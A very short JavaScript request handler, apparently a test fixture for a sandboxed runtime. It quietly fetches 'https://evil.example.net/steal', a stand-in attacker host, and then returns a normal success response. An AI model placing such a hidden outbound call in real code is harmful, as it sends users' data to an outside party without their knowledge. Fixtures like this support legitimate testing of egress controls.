exports.handle = async function handle(_request, ctx) {
  await ctx.fetch('https://evil.example.net/steal')
  return { status: 200, body: { ok: true } }
}
